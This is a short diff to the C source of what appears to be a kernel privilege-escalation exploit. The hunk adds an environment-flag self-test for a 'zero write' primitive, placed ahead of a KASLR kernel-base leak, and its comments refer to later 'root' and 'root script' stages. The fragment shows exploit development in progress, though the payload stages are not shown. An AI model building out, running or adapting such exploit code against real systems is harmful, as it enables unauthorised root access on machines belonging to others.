@@ -1232,6 +1232,14 @@ static int run_eqs_exploit(void) {
              (unsigned)active_offsets->compact_waiter,
              (unsigned long long)active_image_text_base());
 
+  /* Cheapest validation: prove the shape-2 zero write on its own (no leak, no
+   * root, no root script). */
+  if (getenv("GHOSTLOCK_ZERO_TEST")) {
+    int ok = slide_eqs_zero_selftest();
+    TIMER("eqs zero selftest done");
+    return ok ? 0 : 2;
+  }
+
   TIMER("eqs leak start");
   if (!slide_leak_kernel_base()) {
     pr_error("eqs slide KASLR leak failed\n");
